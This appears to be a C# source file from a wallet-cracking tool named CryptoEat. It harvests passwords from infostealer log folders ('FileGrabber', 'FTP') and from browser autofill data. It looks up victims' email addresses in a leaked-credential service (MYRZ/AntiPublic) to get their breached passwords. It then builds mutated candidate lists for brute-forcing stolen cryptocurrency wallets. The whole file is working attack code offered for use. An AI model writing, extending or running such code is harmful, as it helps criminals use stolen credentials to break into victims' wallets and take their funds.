using System.Text.RegularExpressions;
using CryptoEat.Modules.HelpersN;

namespace CryptoEat.Modules.Logs;

internal static partial class PassGen
{
    internal static HashSet<string> PreviousPasswords = new();
    internal static HashSet<string> BruteTopList = new();
    internal static HashSet<string> Mnemos = new();
    internal static char[] Addictions = Array.Empty<char>();

    private static readonly Regex MailRegex = MailRegex1();
    private static readonly Regex PasswordExtractor = PasswordExtractor1();
    private static readonly Regex FtpRegex = FtpRegex1();

    private static async Task<HashSet<string>?> GetAntiPublic(HashSet<string> emails)
    {
        Helpers.SetTitle("Working... | Retrieving passwords from MYRZ");
        var users = (from email in emails.Distinct()
                select MailRegex.Match(email)
                into match
                where match.Success
                select match.Value)
            .Distinct()
            .ToList();
        if (users.Count == 0) return Enumerable.Empty<string>().ToHashSet();

        using var api = new MyrzApi(Generic.Settings.AntiPublicKey!);
        try
        {
            var results = await api.GetEmailPasswords(users, 50);
            if (!string.IsNullOrEmpty(results.error))
            {
                await LogStreams.ErrorLog.WriteLineAsync("Antipublic error: " + results.error);
                await LogStreams.ErrorLog.FlushAsync();
                return Enumerable.Empty<string>().ToHashSet();
            }

            var lines = results.results.Where(x => x.Contains(':'))
                .Distinct()
                .Select(x => x.Split(':')[1]);

            return lines.ToHashSet();
        }
        catch (Exception e)
        {
            // Generic.WriteError(e);
            return Enumerable.Empty<string>().ToHashSet();
        }
    }

    private static HashSet<string> GetFileGrabber(string walletPath)
    {
        var result = new HashSet<string>();

        Helpers.SetTitle("Working... Searching for passwords in FileGrabber");
        var dirInfo = new DirectoryInfo(walletPath);
        for (var i = 0; i < 4; i++)
        {
            if (Directory.Exists(Path.Combine(dirInfo.FullName, "FileGrabber")))
            {
                var folders = FileSystem.ScanDirectories(Path.Combine(dirInfo.FullName, "FileGrabber"), false);
                var files = folders.SelectMany(Directory.EnumerateFiles)
                    .Where(x => Path.GetExtension(x) == ".txt");

                foreach (var file in files)
                    for (var j = 0; j < 2; j++)
                        try
                        {
                            result.UnionWith(PasswordExtractor
                                .Matches(File.ReadAllText(file))
                                .Select(x => x.Groups[1].Value));
                            break;
                        }
                        catch
                        {
                            FileAccessHelper.CheckAndGrantAccess(file);
                        }

                break;
            }

            if (dirInfo.Parent is not null) dirInfo = dirInfo.Parent;
        }

        return result;
    }

    private static HashSet<string> GetFtpPasswords(string walletPath)
    {
        var result = new HashSet<string>(100);

        Helpers.SetTitle("Working... Searching for passwords in FTP");
        var dirInfo = new DirectoryInfo(walletPath);
        for (var i = 0; i < 4; i++)
        {
            if (Directory.Exists(Path.Combine(dirInfo.FullName, "FTP")))
            {
                var folders = FileSystem.ScanDirectories(Path.Combine(dirInfo.FullName, "FTP"), false);
                var files = folders.SelectMany(Directory.EnumerateFiles)
                    .Where(x => Path.GetExtension(x) == ".txt");
                foreach (var file in files)
                    for (var j = 0; j < 2; j++)
                        try
                        {
                            result.UnionWith(FtpRegex
                                .Matches(File.ReadAllText(file))
                                .SelectMany(x => new[] { x.Groups[1].Value, x.Groups[2].Value }));
                            break;
                        }
                        catch
                        {
                            FileAccessHelper.CheckAndGrantAccess(file);
                        }

                break;
            }

            if (dirInfo.Parent is not null) dirInfo = dirInfo.Parent;
        }

        Helpers.SetTitle();

        return result;
    }

    internal static void Combinations(LogsHelper logO, string walletPath, ref HashSet<string> result)
    {
        GC.Collect();

        var fgPasswords = GetFileGrabber(walletPath);
        var ftpPasswords = GetFtpPasswords(walletPath);

        result.UnionWith(logO.Passwords ?? Enumerable.Empty<string>());
        result.UnionWith(logO.AutoFills ?? Enumerable.Empty<string>());
        result.UnionWith(logO.Users ?? Enumerable.Empty<string>());
        result.UnionWith(fgPasswords);
        result.UnionWith(ftpPasswords);

        fgPasswords.Clear();
        ftpPasswords.Clear();

        result.RemoveWhere(x => x.Length < 6);
        Helpers.SetTitle($"Generating combinations [1/3] [{result.Count}]");

        if (Generic.Settings.AntipublicWorking)
        {
            var antipublic = GetAntiPublic(result).Result;
            if (antipublic != null && antipublic.Any())
            {
                result.UnionWith(antipublic);
                antipublic.Clear();
            }
        }

        var tempCopy = result.ToList();

        var added1 = Addictions
            .SelectMany(x => tempCopy.Select(y => x + y))
            .ToList(); // symbol + word
        var added2 = Addictions
            .SelectMany(x => tempCopy.Select(y => y + x))
            .ToList(); // word + symbol
        var added3 = !Generic.Settings.StrongBrute
            ? Addictions.SelectMany(x => tempCopy.Select(y => x + y + x)).ToList()
            : Enumerable.Empty<string>().ToList(); // symbol + word + symbol

        result.UnionWith(added1);
        result.UnionWith(added2);
        result.UnionWith(added3);
        result.RemoveWhere(x => x.Length < 8);

        GC.Collect();
        Helpers.SetTitle($"Generating combinations [2/3] [{result.Count}]");

        if (!Generic.Settings.GpuBrute || result.Count > 10_000_000)
        {
            result.UnionWith(PreviousPasswords);
            result.UnionWith(BruteTopList);
            result.UnionWith(Mnemos);

            // finalize
            added1.Clear();
            added2.Clear();
            added3.Clear();

            return;
        }

        result.UnionWith(Generic.Settings.StrongBrute
            ? Addictions.SelectMany(x => added1.Select(y => y + x))
            : added3);
        result.UnionWith(added1);
        result.RemoveWhere(x => x.Length < 8);

        var comb = CreateCombinations(result);
        result.UnionWith(comb);
        comb.Clear();

        GC.Collect();
        Helpers.SetTitle($"Generating combinations [3/3] [{result.Count}]");

        var comb3 = result.SelectMany(x => new[] { x.ToUpper(), x.ToLower() }).ToList();
        result.UnionWith(comb3);
        comb3.Clear();

        result.UnionWith(BruteTopList);
        result.UnionWith(PreviousPasswords);
        result.UnionWith(Mnemos);

        Helpers.SetTitle();

        // finalize
        added1.Clear();
        added2.Clear();
        added3.Clear();
        return;
    } // Optimized in 3:24 14.05.2023

    private static HashSet<string> CreateCombinations(in IReadOnlyCollection<string> addedAll)
    {
        var result = new HashSet<string>(5000000);
        foreach (var x in addedAll)
        {
            if (x.Length < 8) continue;
            var length = x.Length;
            var modifiedChars = x.ToCharArray();

            if (char.IsLetter(modifiedChars[0]))
                modifiedChars[0] = char.IsUpper(modifiedChars[0])
                    ? char.ToLower(modifiedChars[0])
                    : char.ToUpper(modifiedChars[0]);

            result.Add(string.Concat(modifiedChars));

            if (char.IsLetter(modifiedChars[length - 1]))
                modifiedChars[length - 1] = char.IsUpper(modifiedChars[length - 1])
                    ? char.ToLower(modifiedChars[length - 1])
                    : char.ToUpper(modifiedChars[length - 1]);

            result.Add(string.Concat(modifiedChars));

            if (char.IsLetter(x[length - 1]))
                modifiedChars[length - 1] = char.IsUpper(x[length - 1])
                    ? char.ToLower(x[length - 1])
                    : char.ToUpper(x[length - 1]);

            result.Add(string.Concat(modifiedChars));
        }
        return result;
    }

    [GeneratedRegex(@"(?:\bpass(?:word)?|\bsecret)\b[^\n]*?:\s*(\S+)", RegexOptions.IgnoreCase | RegexOptions.Compiled)]
    private static partial Regex PasswordExtractor1();
    [GeneratedRegex(@"Username: (.*)\s*Password: (.*)", RegexOptions.Compiled)]
    private static partial Regex FtpRegex1();
    [GeneratedRegex(@"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b", RegexOptions.Compiled)]
    private static partial Regex MailRegex1();
}